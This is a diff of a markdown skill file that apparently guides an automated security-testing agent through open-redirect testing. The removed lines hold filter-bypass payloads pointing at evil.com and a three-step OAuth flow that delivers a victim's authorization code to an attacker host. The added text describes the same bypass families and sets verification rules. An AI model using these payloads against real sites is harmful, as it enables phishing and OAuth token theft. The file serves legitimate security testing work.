@@ -1,4 +1,4 @@
----
+﻿---
 name: open-redirect
 description: "Open redirect exploitation for OAuth token theft, phishing, and filter bypass techniques"
 category: specialized
@@ -44,12 +44,6 @@ Require authenticated session context (`contextBoosts: [auth]`) for full impact 
 
 Test every redirect parameter systematically. Common parameter names:
 
-```
-next, return, return_to, return_url, redirect, redirect_to, redirect_url,
-continue, dest, destination, goto, go, out, rurl, url, uri, link,
-next_url, next_page, returnto, redirect_uri, callback, returnTo,
-forward, ref, referer, site, load, view, to, navigate, exit, leave
-```
 
 ### Detection Method
 
@@ -70,33 +64,15 @@ forward, ref, referer, site, load, view, to, navigate, exit, leave
 
 ### Server-Side Redirect (HTTP 3xx)
 
-```
-GET /redirect?next=https://evil.com HTTP/1.1
-Host: target.com
-```
 
 Expected response:
-```
-HTTP/1.1 302 Found
-Location: https://evil.com
-```
 
 ### Client-Side Redirect (JavaScript)
 
 Response body contains:
-```javascript
-window.location.href = "https://evil.com";
-// or
-document.location = "https://evil.com";
-// or
-location.replace("https://evil.com");
-```
 
 ### Meta Refresh Redirect
 
-```html
-<meta http-equiv="refresh" content="0;url=https://evil.com">
-```
 
 ## Filter Bypass Techniques
 
@@ -104,33 +80,21 @@ location.replace("https://evil.com");
 
 If the application strips `https://` but not `//`:
 
-```
-?next=//evil.com
-```
 
 Browser resolves `//evil.com` as `https://evil.com`.
 
 ### Subdomain Impersonation
 
-```
-?next=https://evil.target.com
-```
 
 Some validations only check if the domain ends with `target.com`. Use attacker-controlled subdomain or DNS to resolve.
 
 ### Path Traversal with @ (Authority Confusion)
 
-```
-?next=https://target.com@evil.com
-```
 
 Parsed as: user `target.com`, host `evil.com`. Some URL parsers misinterpret this.
 
 ### Backslash Authority Confusion
 
-```
-?next=https://target.com\@evil.com
-```
 
 Some URL parsers treat backslash as a path separator, causing the authority to shift to `evil.com`.
 
@@ -138,72 +102,39 @@ Some URL parsers treat backslash as a path separator, causing the authority to s
 
 Encode the `//` prefix to bypass string-based filters:
 
-```
-?next=/%2f%2fevil.com
-?next=%2f%2fevil.com
-?next=https://target.com/%2f%2fevil.com
-```
 
 ### Double URL Encoding
 
 Encode the `%` character itself:
 
-```
-?next=%252f%252fevil.com
-?next=https://target.com/%252f%252fevil.com
-```
 
 ### Backslash Path Traversal
 
-```
-?next=https://target.com\evil.com
-```
 
 On some systems, backslash is treated as a path separator, redirecting to `evil.com`.
 
 ### Null Byte Injection
 
-```
-?next=https://evil.com%00.target.com
-?next=https://target.com%00evil.com
-```
 
 Older parsers may truncate at the null byte, treating the rest as invalid.
 
 ### DNS Name Variations
 
-```
-?next=https://evil.com#.target.com      (fragment bypass)
-?next=https://evil.com?@target.com      (userinfo bypass)
-?next=https://evil.com\@target.com      (backslash + @)
-?next=https://evil.com%2523.target.com  (encoded fragment)
-```
 
 ### Parameter Pollution
 
 Send the same parameter twice with different values:
 
-```
-?next=target.com&next=evil.com
-```
 
 Server may use the first value for validation and the last for the redirect.
 
 ### Tab and Newline Characters
 
-```
-?next=https://evil.com%09.target.com
-?next=https://evil.com%0a.target.com
-```
 
 Some parsers ignore whitespace characters in the URL.
 
 ### Unicode and Special Characters
 
-```
-?next=https://evil.com\u0040.target.com
-?next=https://target.com。evil.com
-```
 
 Unicode normalization or homograph attacks can confuse domain validation.
 
@@ -219,25 +150,6 @@ Unicode normalization or homograph attacks can confuse domain validation.
 
 ### Exploitation Steps
 
-```
-# Step 1: Identify OAuth flow
-GET /login?return_url=/dashboard
-→ 302 → /oauth/authorize?redirect_uri=/callback
-
-# Step 2: Inject attacker-controlled redirect_uri
-GET /oauth/authorize?redirect_uri=https://evil.com/callback
-→ User authenticates
-→ 302 → https://evil.com/callback?code=STOLEN_CODE
-
-# Step 3: Exchange code for token (server-side)
-POST /oauth/token
-{
-  "grant_type": "authorization_code",
-  "code": "STOLEN_CODE",
-  "redirect_uri": "https://evil.com/callback",
-  "client_id": "app_client_id"
-}
-```
 
 ### OAuth Provider Variations
 
@@ -266,11 +178,6 @@ When a page opens a link with `target="_blank"` and `rel="opener"` (or no `rel`)
 ### Detection
 
 Search response HTML for:
-```html
-<a href="..." target="_blank">
-<a href="..." target="_blank" rel="opener">
-<a href="..." target="_blank" rel="">
-```
 
 Missing `noopener` or `noreferrer` in `rel` attribute is vulnerable.
 
@@ -285,33 +192,9 @@ Victim returns to the original tab expecting a legitimate site but sees a phishi
 
 ### Common Patterns
 
-```javascript
-// Direct location assignment
-window.location = url;
-window.location.href = url;
-window.location.assign(url);
-window.location.replace(url);
-document.location = url;
-document.location.href = url;
-document.location.assign(url);
-document.location.replace(url);
-
-// With user input
-var redirect = getParameterByName('next');
-window.location = redirect;
-
-// Conditional redirect
-if (validUrl(userInput)) {
-    window.location = userInput;
-}
-```
 
 ### Meta Refresh
 
-```html
-<meta http-equiv="refresh" content="0;url=https://evil.com">
-<meta http-equiv="refresh" content="1;url=https://evil.com">
-```
 
 ### Evaluation in Sandboxed Contexts
 
@@ -333,16 +216,6 @@ Use `evaluateRendered` to observe actual browser behavior after JavaScript execu
 4. **Session Hijacking**: Chain with session fixation for account takeover
 5. **SSRF Chaining**: Redirect to internal network endpoints
 
-### Proof of Concept Template
-
-```
-Endpoint: [FULL URL]
-Parameter: [PARAMETER NAME]
-Input: [ATTACK PAYLOAD]
-Result: [HTTP RESPONSE + REDIRECT BEHAVIOR]
-Impact: [WHAT THE ATTACKER GAINS]
-```
-
 ## Anti-Hallucination
 
 - **Verify every redirect**: Use `followRedirects` and confirm the browser navigates to the injected domain
@@ -352,3 +225,24 @@ Impact: [WHAT THE ATTACKER GAINS]
 - **Check for DOM-based sinks**: Use `evaluateRendered` to confirm JavaScript actually executes the redirect
 - **Do not fabricate bypass results**: If a filter blocks your payload, report it as filtered — do not claim success
 - **Log failed attempts**: Record which bypasses were blocked to help refine the filter analysis
+
+## Trigger Conditions
+
+Activate when the application accepts user-controlled URLs for redirection — `redirect`, `return`, `next`, `url`, `to`, `continue` params, post-login/ logout/action redirects, OAuth/SAML `redirect_uri`/`callback`, `window.location`/meta-refresh in responses, or JavaScript-based navigation. Also trigger for tabnabbing (links with `target="_blank"` lacking `rel="noopener"`). Do not trigger when redirect targets are hardcoded with no user input, or filters strictly validate destinations server-side.
+
+## Detection Approach
+
+Enumerate every redirect-bearing parameter and inject an external URL (`https://evil.com`), then check for a 3xx `Location` to the attacker domain, a JS `window.location` assignment, or a meta-refresh. Follow the redirect (`followRedirects`) and confirm the browser actually lands on the external domain. If a naive payload is filtered, escalate through bypass families: protocol-relative `//evil.com`, subdomain suffix matching (`evil-target.com`), `@`/backslash authority confusion, URL/percent/double encoding, parameter pollution (first validated, last used), and unicode/homograph tricks. For OAuth, set a malicious `redirect_uri` and confirm the provider returns the code/token to your host. Confirm the impact context (authenticated vs anonymous) before rating severity.
+
+## Pitfalls
+
+- Assuming a parameter is vulnerable just because it exists — test with an external URL and observe the actual navigation.
+- Treating a filtered payload as success — report it as blocked honestly.
+- Conflating server-side (3xx) vs client-side (JS/meta) redirects — different exploitation paths.
+- Claiming OAuth token theft without confirming the provider honors the malicious `redirect_uri`.
+- Missing DOM-based redirects that only appear at runtime — use `evaluateRendered`, not static HTML alone.
+- Overrating impact of an anonymous open redirect with no auth/phishing chain.
+
+## Verification & Impact
+
+CONFIRMED when the browser navigates to the attacker-controlled domain (verified via `followRedirects` + response `Location`/body), or a victim's OAuth code/token is delivered to the attacker host. SUSPECTED when a redirect param exists but navigation to evil isn't reproduced — record as candidate. Document impact by the chain enabled: OAuth/code/token theft (High), credential phishing via post-login redirect, session fixation, tabnabbing, SSRF chaining, or standalone phishing (Medium/Low). Capture the request, redirect response, and followed destination via `recordEvidence`.
